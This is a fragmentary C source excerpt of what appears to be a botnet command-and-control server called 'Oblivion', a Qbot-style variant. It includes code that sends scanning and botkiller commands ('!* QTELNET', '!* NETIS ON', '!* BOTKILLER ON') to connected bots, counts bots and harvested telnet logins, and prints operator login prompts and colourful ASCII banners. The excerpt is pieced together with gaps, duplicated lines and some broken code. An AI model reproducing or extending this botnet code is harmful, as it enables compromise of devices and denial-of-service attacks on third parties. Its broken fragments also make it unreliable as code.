...
char *colorCodes[] = {"31m", "32m", "33m", "37m", "35m", "36m"};
...
if(sendMGM && managements[i].connected) send(i, lol, strlen(lol), MSG_NOSIGNAL);
else send(i, "\n", 1, MSG_NOSIGNAL);
}
free(wot);
}
...
int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					...
					if(clients[ipIndex].ip == clients[infd].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
...
send(infd, "!* QTELNET 1500 1\r\n", 19, MSG_NOSIGNAL);
send(infd, "!* NETIS ON\r\n", 13, MSG_NOSIGNAL);
send(infd, "!* BOTKILLER ON\r\n", 17, MSG_NOSIGNAL);
}
continue;
}
else
...
sprintf(string, "%c]0; :|: Bots Online: %d :|: Telnet Logins: %d :|: Users Online: %d :|:%c", '\033', clientsConnected(), TELFound, managesConnected, '\007');
...
sprintf(hackz, "\x1b[%sUsername:\x1b[%s ", colorCodes[(rand() % 6)], colorCodes[(rand() % 2)]);
...
if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;//im a hacker hehehe
		...
		char *root226[1024];
		  ...
		  /*
		sprintf(root226, "\x1b[%s Loading Oblivion By xFyfa | @ethan.sh [ %d %]\r\n\r\n", colorCodes[rand() % 5]);
		sleep(.9);
		if(send(thefd, "\x1b[31m[x] DDOS | Succesfully hijacked connection.\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
		sleep(1.7);

		if(send(thefd, "\x1b[33m[x] DDOS | Masking connection from utmp+wtmp...\r\n", 59, MSG_NOSIGNAL) == -1) goto end;
		sleep(1.2);
		if(send(thefd, "\x1b[35m[x] DDOS | Hiding from netstat...\r\n", 46, MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(thefd, "\x1b[36m[x] DDOS | Removing all traces of LD_PRELOAD...\r\n", 57, MSG_NOSIGNAL) == -1) goto end;
		sleep(1.7);
		int ii;
		for( ii = 0; ii < 5; ii++ )
		{
        sleep(.9);
		sprintf(root224, "\x1b[%s [x] DDOS | Wiping env libc.poison.so.%d\r\n", colorCodes[rand() % 5], ii + 1 );
		if(send(thefd, root224, strlen(root224), MSG_NOSIGNAL) == -1) goto end;
		sleep(.6);
		}
		sleep(1.3);
		if(send(thefd, "\x1b[31m[X] DDOS | Setting up virtual terminal...\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
...
sprintf(ascii_banner_line1, " \x1b[%s                                                                    \r\n", colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line2, " \x1b[%s            \x1b[%s ,,       \x1b[%s ,,   \x1b[%s ,,   \x1b[%s           ,, \x1b[%s    \x1b[%s                \r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line3, " \x1b[%s   .g8""8q. \x1b[%s  *MM     \x1b[%s `7MM    db       \x1b[%s       db     \x1b[%s     \x1b[%s           \r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line4, " \x1b[%s.dP'    `YM.\x1b[%s MM       \x1b[%s MM               \x1b[%s            \x1b[%s     \x1b[%s           \r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line5, " \x1b[%sdM'      `MM \x1b[%sMM,dMMb.  \x1b[%sMM  \x1b[%s`7MM \x1b[%s`7M'   `MF'\x1b[%s`7MM \x1b[%s ,pW'Wq.\x1b[%s`7MMpMMMb.  \r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line6, " \x1b[%sMM        MM \x1b[%sMM    `Mb \x1b[%sMM  \x1b[%s  MM  \x1b[%s VA   ,V   \x1b[%s MM \x1b[%s6W'   `Wb \x1b[%sMM    MM  \r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line7, " \x1b[%sMM.      ,MP \x1b[%sMM     M8 \x1b[%sMM  \x1b[%s  MM   \x1b[%s VA ,V   \x1b[%s  MM \x1b[%s8M     M8 \x1b[%sMM    MM  \r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line8, " \x1b[%s`Mb.    ,dP'\x1b[%s MM.   ,M9 \x1b[%sMM   \x1b[%s MM    \x1b[%s VVV    \x1b[%s  MM \x1b[%sYA.   ,A9 \x1b[%sMM    MM  \r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line9, " \x1b[%s  ''bmmd''  \x1b[%s P^YbmdP'\x1b[%s.JMML..\x1b[%sJMML.   \x1b[%s W    \x1b[%s .JMML.\x1b[%s`Ybmd9'\x1b[%s.JMML  JMML.\r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line10,"                \x1b[%s  B Y \x1b[%s x F Y F A\x1b[%s |\x1b[%s @ JAEDEN_A_J_D                  \r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line11,"              \x1b[31m <-------------------------------------->                                                \r\n");
...
sprintf(ascii_banner_line8, " \x1b[%s`Mb.    ,dP'\x1b[%s MM.   ,M9 \x1b[%sMM   \x1b[%s MM    \x1b[%s VVV    \x1b[%s  MM \x1b[%sYA.   ,A9 \x1b[%sMM    MM  \r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line9, " \x1b[%s  ''bmmd''  \x1b[%s P^YbmdP'\x1b[%s.JMML..\x1b[%sJMML.   \x1b[%s W    \x1b[%s .JMML.\x1b[%s`Ybmd9'\x1b[%s.JMML  JMML.\r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line10,"                \x1b[%s  B Y \x1b[%s x F Y F A\x1b[%s |\x1b[%s @ E T H A N . S H                  \r\n", colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)], colorCodes[(rand() % 6)]);
sprintf(ascii_banner_line11,"              \x1b[31m <-------------------------------------->                                                \r\n");
	if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		...
		if(send(thefd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line11, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
sprintf(hackz, "                  \x1b[%s\r\nWelcome,\x1b[34m %s\x1b[%s To the Oblivion\r\n\r\n", colorCodes[(rand() % 6)], usernames, colorCodes[(rand() % 6)]);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
pthread_create(&title, NULL, &titleWriter, sock);
managements[thefd].connected = 1;
